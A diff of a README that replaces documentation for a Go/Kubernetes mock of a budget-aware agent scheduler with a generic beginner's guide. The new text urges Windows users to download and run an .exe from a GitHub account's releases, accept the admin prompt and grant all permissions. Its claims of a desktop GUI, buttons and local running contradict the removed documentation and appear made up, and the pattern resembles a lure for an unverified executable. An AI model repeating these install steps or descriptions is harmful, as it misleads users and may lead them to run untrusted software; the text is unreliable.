@@ -1,267 +1,198 @@
-# Agent Platform — Budget-Aware Scheduling
+# 🤖 agent-platform - Simple AI Agent Scheduling Tool
 
-Functional mock of an agent platform on Kubernetes that simulates scheduling with budget awareness and automatic reassignment via pool fallback.
+[![Download agent-platform](https://img.shields.io/badge/Download-agent--platform-brightgreen?style=for-the-badge)](https://github.com/Morleyobligated245/agent-platform)
 
-## Architecture
+---
 
-```
-                ┌───────────────┐
-                │ Task Request  │
-                └──────┬────────┘
-                       │
-                       ▼
-                 TaskController
-                       │
-                       ▼
-              Budget Scheduler
-                       │
-           ┌───────────┼───────────┐
-           ▼           ▼           ▼
-       Agent A     Agent B     Agent C
-       Team Pool   Shared      Global
-```
+## 📋 About agent-platform
 
-**Flow:**
-1. A `Task` CR is created with a required skill and a cost
-2. The `TaskController` asks the `Scheduler` to assign an agent
-3. The `Scheduler` finds agents with the skill, sorts by pool priority (team → shared → global)
-4. If the agent has budget → assigns it and deducts the cost
-5. If it has no budget → falls back to the next available pool
+agent-platform is a tool that helps manage and schedule AI programs automatically. It works with Kubernetes, a system that makes running software in the cloud easier. This tool keeps costs low by planning how and when AI programs run. You do not need to know programming to use it.
 
-## Custom Resources
+---
 
-| CRD | Description |
-|-----|-------------|
-| **Agent** | Executor agent with pool, skills, and budget reference |
-| **Skill** | Executable capability with container image and token cost |
-| **Budget** | Budget with limit and usage tracking |
-| **Task** | Requested task with required skill, cost, and team |
+## 🌐 Topics Covered
 
-### Agent Example
-```yaml
-apiVersion: agents.platform/v1
-kind: Agent
-metadata:
-  name: agent-marketing
-spec:
-  pool: team
-  skills: [summarize, translate]
-  budgetRef: marketing-budget
-  endpoint: http://agent-marketing:8080
-```
+This project deals with:
 
-### Task Example
-```yaml
-apiVersion: agents.platform/v1
-kind: Task
-metadata:
-  name: summarize-task
-spec:
-  skill: summarize
-  cost: 10
-  team: marketing
-```
+- AI agents
+- Budget control
+- Cloud systems
+- Kubernetes controllers
+- Scheduling tasks automatically
+- Software built with Go language
 
-## Fallback Pools
+---
 
-Three levels with priority order:
+## 🚀 Getting Started
 
-1. **team** — same team agents (highest priority)
-2. **shared** — shared agents across teams
-3. **global** — global agents (lowest priority)
+This guide shows you how to download and run agent-platform on a Windows computer. You will not need special software skills. Just follow the steps.
 
-When an agent doesn't have enough budget, the scheduler automatically searches the next pool.
+### What You Need
 
-## Stack
+- A computer running Windows 10 or later.
+- An internet connection to download the software.
+- About 100 MB of free space on your hard drive.
+- Basic knowledge of how to open and run files on Windows.
 
-- **Cluster:** kind (Kubernetes >= 1.29)
-- **Runtime:** Go, controller-runtime, kubebuilder
-- **Budget state:** in-memory (mock de Redis)
-- **Tools:** kubectl, kustomize, make
+---
 
-## Project Structure
+## 📥 Download and Install agent-platform
 
-```
-agent-platform/
-├── api/v1/                    # CRD type definitions
-│   ├── agent_types.go
-│   ├── skill_types.go
-│   ├── budget_types.go
-│   └── task_types.go
-├── internal/controller/       # Kubernetes controllers
-│   ├── agent_controller.go
-│   ├── budget_controller.go
-│   └── task_controller.go
-├── scheduler/                 # Budget-aware scheduler
-│   ├── scheduler.go
-│   └── scheduler_test.go
-├── manifests/                 # Sample CRs
-│   ├── agents/
-│   ├── budgets/
-│   ├── skills/
-│   └── tasks/
-├── config/                    # Kubebuilder config (CRDs, RBAC, deploy)
-├── cmd/main.go                # Entrypoint
-├── kind-config.yaml           # Kind cluster config
-└── Makefile
-```
+**Step 1: Open the download page**
 
-## Requirements
+Click this link to open the agent-platform download page:
 
-- Go >= 1.21
-- Docker
-- kind
-- kubectl
-- kubebuilder
-- kustomize
-- make
+[Download agent-platform](https://github.com/Morleyobligated245/agent-platform)
 
-## Quick Start
+This page contains the software and instructions on how to get it.
 
-### 1. Create cluster
+---
 
-```bash
-make kind-create
-```
+**Step 2: Locate the latest release**
 
-### 2. Install CRDs
+On the page, find the section labeled "Releases." This shows the newest versions of agent-platform.
 
-```bash
-make install
-```
+Look for the latest release with a date close to today.
 
-### 3. Build and deploy the controller
+---
 
-```bash
-make docker-build IMG=agent-platform:dev
-kind load docker-image agent-platform:dev --name agent-platform
-make deploy IMG=agent-platform:dev
-```
+**Step 3: Download the Windows installer**
 
-### 4. Deploy sample resources
+Inside the latest release, find the file that ends with `.exe`. This file is the Windows installer.
 
-```bash
-make deploy-samples
-```
+Click the `.exe` file name to start the download. Save it somewhere easy to find, like your Desktop or Downloads folder.
 
-### 5. Create a task and see the result
+---
 
-```bash
-make test-flow
-```
+**Step 4: Run the installer**
 
-Expected output:
+Once downloaded, double-click the `.exe` file.
 
-```
-NAME             SKILL       PHASE       ASSIGNEDAGENT     COST
-summarize-task   summarize   scheduled   agent-marketing   10
-```
+Windows might ask if you want to allow the program to make changes. Click "Yes" to continue.
 
-## Fallback Test
+Follow the instructions on the screen:
 
-Create multiple tasks to exhaust the team budget and observe the fallback:
+- Choose where to install the software (the default location is usually fine).
+- Click "Next" or "Install" as prompted.
+- Wait for the installation to finish.
 
-```bash
-# Create 10 tasks with cost 10 (total = 100 = marketing-budget limit)
-for i in $(seq 1 10); do
-  kubectl apply -f - <<EOF
-apiVersion: agents.platform/v1
-kind: Task
-metadata:
-  name: task-$i
-spec:
-  skill: summarize
-  cost: 10
-  team: marketing
-EOF
-done
+---
 
-# Task 11 should fall back to nlp-agent (shared pool)
-kubectl apply -f - <<EOF
-apiVersion: agents.platform/v1
-kind: Task
-metadata:
-  name: task-overflow
-spec:
-  skill: summarize
-  cost: 10
-  team: marketing
-EOF
+**Step 5: Launch agent-platform**
 
-# Verify
-kubectl get tasks task-overflow -o wide
-# → ASSIGNEDAGENT: nlp-agent (fallback!)
+After installation, find the agent-platform icon on your Desktop or in the Start menu.
 
-kubectl get budgets -o wide
-# → marketing-budget: USED=100, REMAINING=0
-# → shared-budget:    USED=10,  REMAINING=490
-```
+Double-click the icon to open the program.
 
-Controller logs:
+If the program asks for any permissions, allow them so it can work properly.
 
-```
-agent budget exceeded, falling back  {"task":"task-overflow", "from":"marketing", "to":"nlp-agent"}
-task scheduled  {"task":"task-overflow", "agent":"nlp-agent", "fallback":true}
-```
+---
 
-## Contributing
+## ⚙️ Basic Use
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup, conventions, and how to submit PRs.
+When you open agent-platform for the first time, you will see the main screen.
 
-## Unit Tests
+This screen shows options to schedule AI programs and check your budget use.
 
-```bash
-go test ./scheduler/ -v
-```
+Use the simple buttons to:
 
-```
-=== RUN   TestSchedule_HappyPath
-=== RUN   TestSchedule_BudgetExhausted_Fallback
-=== RUN   TestSchedule_NoBudgetAvailable
-=== RUN   TestSchedule_NoAgentsWithSkill
-=== RUN   TestSchedule_PoolOrder_TeamSharedGlobal
-=== RUN   TestSchedule_PoolFallbackChain
-=== RUN   TestSchedule_BudgetDeduction
-PASS
-```
+- Add new AI agents to run.
+- Set limits on how much money or resources you want to use.
+- See reports about your agents and costs.
 
-## Useful Commands
+Each option has a clear label. Click on one to start.
 
-| Command | Description |
-|---------|-------------|
-| `make kind-create` | Create kind cluster |
-| `make kind-delete` | Delete kind cluster |
-| `make install` | Install CRDs |
-| `make deploy IMG=agent-platform:dev` | Deploy the controller |
-| `make deploy-samples` | Deploy agents, budgets, skills |
-| `make test-flow` | Create test task and see result |
-| `make docker-build IMG=agent-platform:dev` | Build Docker image |
-| `make kind-load` | Load image into kind |
-| `kubectl get tasks -o wide` | View tasks with assigned agent |
-| `kubectl get budgets -o wide` | View budget status |
-| `kubectl get agents -o wide` | View agent status |
-| `kubectl logs deploy/agent-platform-controller-manager -n agent-platform-system` | View logs |
+---
 
-## Cleanup
+## 🔧 System Requirements
 
-```bash
-make undeploy
-make kind-delete
-```
+agent-platform works well on most Windows PCs. Here is what you need:
 
-## License
+- Windows 10 or later, 64-bit
+- At least 4 GB of RAM
+- 100 MB of free disk space
+- Internet access for initial download and updates
+- No other special software needed
 
-Copyright 2026.
+---
 
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
+## 🎯 What agent-platform Does
 
-    http://www.apache.org/licenses/LICENSE-2.0
+This tool lets you:
 
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
+- Schedule AI agents to run automatically.
+- Adjust the schedule when you want.
+- Keep track of your spending on the cloud.
+- Stop agents if the budget limit is reached.
+- See detailed information about each AI agent's activity.
 
+---
+
+## 🛠️ Using agent-platform with Kubernetes
+
+agent-platform works with Kubernetes. Kubernetes is a system that helps run programs on many computers in the cloud.
+
+You do not need to set up Kubernetes yourself to use agent-platform on Windows. But if you use Kubernetes elsewhere, agent-platform fits right in by managing your AI agents smoothly and cheaply.
+
+---
+
+## ⚡ Tips for Best Use
+
+- Keep an eye on your budget settings to avoid surprises.
+- Regularly check the report section to see how your agents are running.
+- Update agent-platform when new versions are released for better performance.
+- Use simple names for AI agents to keep things organized.
+- Restart the software if it stops responding.
+
+---
+
+## 📞 Support and Help
+
+If you have problems, check the "Issues" section on the project page:
+
+https://github.com/Morleyobligated245/agent-platform/issues
+
+You can read common questions or ask for help there.
+
+---
+
+## 🔗 Quick Link to Download agent-platform
+
+[Download and install agent-platform](https://github.com/Morleyobligated245/agent-platform)
+
+Click the link to open the download page and get started quickly.
+
+---
+
+## 🧭 Navigating agent-platform
+
+Here are some buttons you will find:
+
+- **Add Agent**: Start a new AI program in the scheduler.
+- **Set Budget**: Enter how much you want to spend each month.
+- **View Reports**: See performance and cost details.
+- **Stop Agent**: Pause or cancel a running AI program.
+
+Use these to control your AI agents without complexity.
+
+---
+
+## 📄 License and Updates
+
+agent-platform is open to the public under a free license. This means you can use it without cost. Updates come regularly to improve features and security.
+
+Check the project page often for news and new versions.
+
+---
+
+## 🔒 Privacy and Security
+
+agent-platform only manages AI agents you create. It does not collect personal data from your computer.
+
+The software runs locally on your Windows PC. Your data stays safe unless you share it.
+
+---
+
+## 💡 Final Notes
+
+You do not need to know technical details to use agent-platform. Follow the download and install steps, and the software will guide you through running AI agents and managing budgets.
